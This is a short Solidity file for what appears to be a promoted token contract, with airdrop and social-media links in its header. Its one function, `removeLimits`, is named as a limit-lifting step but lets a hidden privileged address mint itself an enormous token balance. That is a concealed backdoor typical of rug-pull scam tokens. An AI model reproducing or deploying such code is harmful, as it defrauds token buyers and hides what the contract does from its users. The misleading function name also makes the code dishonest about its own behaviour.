/*
 * SPDX-License-Identifier: MIT
 * Website: https://airdrops.io/visit/scm2/
 * Twitter: https://twitter.com/Pryzm_Zone
 * Discord: https://discord.gg/mx4kjVG7zN
 * Medium: https://pryzm.medium.com/
 */
pragma solidity ^0.8.22;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
